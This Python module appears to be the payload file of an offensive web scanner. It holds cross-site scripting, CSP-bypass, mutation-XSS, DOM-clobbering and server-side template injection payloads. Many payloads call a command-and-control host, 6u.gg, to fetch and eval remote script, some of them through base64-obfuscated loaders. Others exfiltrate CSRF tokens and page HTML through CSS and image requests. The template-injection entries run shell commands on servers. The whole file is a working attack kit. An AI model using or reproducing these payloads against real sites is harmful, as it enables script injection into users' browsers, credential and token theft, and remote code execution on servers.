"""
XSS payloads - AWVS10 base + 2018-2025 updates + 6u.gg C2 integration.
Context-aware payloads, CSP bypasses, mXSS, SSTI, DOM clobbering, polyglots.
"""
import random
import string

OOB_DOMAIN = "6u.gg"
OOB_SCRIPT = f"//{OOB_DOMAIN}/x.js"
OOB_CALLBACK = f"//{OOB_DOMAIN}/callback"
OOB_DNS = f"d.{OOB_DOMAIN}"


def rand_tag():
    return "gk" + "".join(random.choices(string.ascii_lowercase, k=4))


def rand_token():
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=8))


PROBE_MARKER = "genkiprobe"

REFLECTION_PROBES = [
    lambda t: f"{t}9{rand_token()}",
    lambda t: f"<{t}>{rand_token()}</{t}>",
    lambda t: f'"{rand_token()}',
    lambda t: f"'{rand_token()}",
]

# --- AUTO-FIRE PAYLOADS (no user interaction) ---

TEXT_CONTEXT_PAYLOADS = [
    lambda: f"<script>alert('{rand_token()}')</script>",
    lambda: f"<ScRiPt>alert('{rand_token()}')</ScRiPt>",
    lambda: f"<img src=x onerror=alert('{rand_token()}')>",
    lambda: f"<svg onload=alert('{rand_token()}')>",
    lambda: f"<{rand_tag()} id=x tabindex=1 onfocus=alert('{rand_token()}') autofocus></{rand_tag()}>",
    lambda: f"<details open ontoggle=alert('{rand_token()}')>",
    lambda: f"<body onload=alert('{rand_token()}')>",
    lambda: f"<audio src/onerror=alert('{rand_token()}')>",
    lambda: f"<video><source onerror=alert('{rand_token()}')>",
    lambda: f"<input type=image src=x onerror=alert('{rand_token()}')>",
    lambda: f"<svg><animate onbegin=alert('{rand_token()}') attributeName=x dur=1s>",
    lambda: f"<svg><set onbegin=alert('{rand_token()}') attributeName=x to=y>",
    lambda: f"<marquee onstart=alert('{rand_token()}')>",
    lambda: f"<div onscrollend=alert('{rand_token()}') style=\"overflow:auto;height:50px\"><div style=height:500px></div></div>",
    lambda: f"<style>@keyframes x{{}}</style><xss style=\"animation-name:x\" onanimationend=\"alert('{rand_token()}')\"></xss>",
    lambda: f"<xss onfocusin=alert('{rand_token()}') autofocus tabindex=1></xss>",
    lambda: f"<body onpageshow=alert('{rand_token()}')>",
    lambda: f"<link rel=stylesheet onerror=alert('{rand_token()}') href=x>",
]

ATTR_DOUBLE_QUOTE_PAYLOADS = [
    lambda: f'"><script>alert("{rand_token()}")</script>',
    lambda: f'" autofocus onfocus="alert(\'{rand_token()}\')" x="',
    lambda: f'"><img src=x onerror=alert("{rand_token()}")>',
    lambda: f'"><svg onload=alert("{rand_token()}")>',
    lambda: f'" onmouseover="alert(\'{rand_token()}\')" style="position:fixed;top:0;left:0;width:100%;height:100%" x="',
    lambda: f'"><details open ontoggle=alert("{rand_token()}")>',
]

ATTR_SINGLE_QUOTE_PAYLOADS = [
    lambda: f"'><script>alert('{rand_token()}')</script>",
    lambda: f"' autofocus onfocus='alert(\"{rand_token()}\")' x='",
    lambda: f"'><img src=x onerror=alert('{rand_token()}')>",
    lambda: f"'><svg onload=alert('{rand_token()}')>",
]

ATTR_NO_QUOTE_PAYLOADS = [
    lambda: f" onfocus=alert('{rand_token()}') autofocus ",
    lambda: f" onmouseover=alert('{rand_token()}') ",
    lambda: f"><img src=x onerror=alert('{rand_token()}')>",
    lambda: f" autofocus onfocusin=alert('{rand_token()}') tabindex=1 ",
]

SCRIPT_CONTEXT_PAYLOADS = [
    lambda: f"</script><script>alert('{rand_token()}')</script>",
    lambda: f"'-alert('{rand_token()}')-'",
    lambda: f"\"-alert('{rand_token()}')-\"",
    lambda: f";alert('{rand_token()}');//",
    lambda: f"\\'-alert('{rand_token()}')//",
]

# --- C2 PAYLOADS (6u.gg callback) ---

C2_PAYLOADS = [
    f'<script src={OOB_SCRIPT}></script>',
    f'<script src=//{OOB_DOMAIN}></script>',
    f"<img src=x onerror=\"s=document.createElement('script');s.src='{OOB_SCRIPT}';document.head.appendChild(s)\">",
    f'<svg onload="s=document.createElement(\'script\');s.src=\'{OOB_SCRIPT}\';document.head.appendChild(s)">',
    f"<script>fetch('{OOB_SCRIPT}').then(r=>r.text()).then(eval)</script>",
    f"<script>import('{OOB_SCRIPT}')</script>",
    f"<script>$.getScript('{OOB_SCRIPT}')</script>",
]

C2_BLIND_PAYLOADS = [
    f'"><script src={OOB_SCRIPT}></script>',
    f"'><script src={OOB_SCRIPT}></script>",
    f'"><img src=x onerror="var s=document.createElement(\'script\');s.src=\'{OOB_SCRIPT}\';document.head.appendChild(s)">',
    f"<input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vNnUuZ2cveC5qcyI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= autofocus>",
    f'"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vNnUuZ2cveC5qcyI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= onerror=eval(atob(this.id))>',
]

# --- CSP BYPASS PAYLOADS ---

CSP_BYPASSES = [
    f'<link rel="dns-prefetch" href="//{OOB_DNS}">',
    f'<meta http-equiv="refresh" content="0;url=//{OOB_DOMAIN}/callback/xss">',
    f'<base href="//{OOB_DOMAIN}/">',
    f'<object data="//{OOB_DOMAIN}/callback/xss"></object>',
    f'<form action="//{OOB_DOMAIN}/callback/form-exfil"><button>Click</button></form>',
    f'<img src="//{OOB_DOMAIN}/callback/steal?html=',
    '<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)//"></script>',
    '<script src="https://www.google.com/complete/search?client=chrome&q=a&callback=alert"></script>',
    f'<script type="speculationrules">{{"prefetch":[{{"source":"list","urls":["//{OOB_DOMAIN}/callback/speculate"]}}]}}</script>',
]

CSP_CSS_EXFIL = [
    f'<style>@import url(//{OOB_DOMAIN}/css-exfil?selector=input[name=csrf_token]&pos=0);</style>',
    f'<style>input[name=csrf][value^="a"]{{background:url(//{OOB_DOMAIN}/callback/css?v=a)}}</style>',
    f'<link rel=stylesheet href="//{OOB_DOMAIN}/callback/css-exfil">',
    f'<style>@font-face{{font-family:x;src:url(//{OOB_DOMAIN}/callback/css?c=A);unicode-range:U+0041}}*{{font-family:x,sans-serif}}</style>',
]

# --- MUTATION XSS (DOMPurify bypasses) ---

MXSS_PAYLOADS = [
    '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>',
    '<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">',
    "<math><mtext><style><img src=x onerror=alert(1)></style></mtext></math>",
    "<svg><style><![CDATA[</style><img src=x onerror=alert(1)>]]>",
    '<form><div>' + '<div>' * 22 + '<img src=x onerror=alert(1)>',
]

# --- POLYGLOT XSS ---

POLYGLOT_PAYLOADS = [
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%%0telerik0telerik11telerik/telerik/oNcliCk=alert()//><svg/onload=alert()//",
    '"><img src=x onerror=alert(1)//>',
    "'--><svg/onload=alert(1)>",
    "javascript:alert(1)//\"><img src=x onerror=alert(1)>/*",
]

# --- PORTSWIGGER 2026 RESEARCH PAYLOADS ---

TAG_NAME_PAYLOADS = [
    '<alert(1) onfocus="attributes[0].value=localName,new onfocus" autofocus tabindex=1>',
    "<JAVASCRIPT:ALERT(1) onfocus=location=localName autofocus tabindex=1>",
    '<div onfocus="eval(textContent)" autofocus tabindex=1>alert(1)</div>',
    '<div class="alert(1)" onfocus="eval(classList[0])" autofocus tabindex=1></div>',
    '<div data-x="alert(1)" onfocus="eval(dataset.x)" autofocus tabindex=1></div>',
]

# --- SSTI PAYLOADS (updated 2018-2025) ---

TEMPLATE_INJECTION_PAYLOADS = [
    ("angularjs", "{{7*7}}"),
    ("angularjs", "{{constructor.constructor('alert(1)')()}}"),
    ("vue", "{{constructor.constructor('alert(1)')()}}"),
    ("vue", "{{_c.constructor('alert(1)')()}}"),
    ("jinja2", "{{7*'7'}}"),
    ("jinja2", "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"),
    ("jinja2", "{{lipsum.__globals__.os.popen('id').read()}}"),
    ("jinja2", "{{cycler.__init__.__globals__.os.popen('id').read()}}"),
    ("twig", "{{7*7}}"),
    ("twig", "{{['id']|filter('system')}}"),
    ("freemarker", "${7*7}"),
    ("erb", "<%= 7*7 %>"),
    ("ejs", "<%= global.process.mainModule.require('child_process').execSync('id') %>"),
    ("pebble", "{% set cmd = 'id' %}"),
    ("thymeleaf", "__${T(java.lang.Runtime).getRuntime().exec('id')}__::x"),
    ("handlebars", "{{#with 'constructor' as |string|}}{{string.name}}{{/with}}"),
    ("pug", "-var x = global.process.mainModule.require('child_process').execSync('id')"),
]

TEMPLATE_EXPECTED = {
    "{{7*7}}": "49",
    "{{7*'7'}}": "7777777",
    "${7*7}": "49",
    "<%= 7*7 %>": "49",
}

# --- DOM CLOBBERING ---

DOM_CLOBBERING_PAYLOADS = [
    '<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">',
    '<form id=x><input name=y value=overwritten>',
    '<img name=getElementById><img id=x src=x onerror=alert(1)>',
    '<a id=CONFIG href="javascript:alert(1)">',
    '<form id=x name=y><input id=x name=z value=clobbered>',
]

# --- DOM XSS SOURCES AND SINKS ---

DOM_XSS_SOURCES = [
    "document.location",
    "document.URL",
    "document.documentURI",
    "document.referrer",
    "window.location",
    "window.name",
    "location.hash",
    "location.search",
    "location.href",
    "document.baseURI",
    "window.postMessage",
    "history.pushState",
    "history.replaceState",
]

DOM_XSS_SINKS = [
    "innerHTML",
    "outerHTML",
    "document.write",
    "document.writeln",
    "eval(",
    "setTimeout(",
    "setInterval(",
    "Function(",
    ".src=",
    ".href=",
    "$.html(",
    ".append(",
    "setHTMLUnsafe(",
    "insertAdjacentHTML(",
    "import(",
    "createContextualFragment(",
]

# --- MARKDOWN XSS ---

MARKDOWN_XSS = [
    "[click](javascript:alert(1))",
    "[click](JaVaScRiPt:alert(1))",
    "[click](java\tscript:alert(1))",
    "[click](data:text/html,<script>alert(1)</script>)",
    "[click](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)",
    "![img](javascript:alert(1))",
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    "<details open ontoggle=alert(1)><summary>click</summary></details>",
]
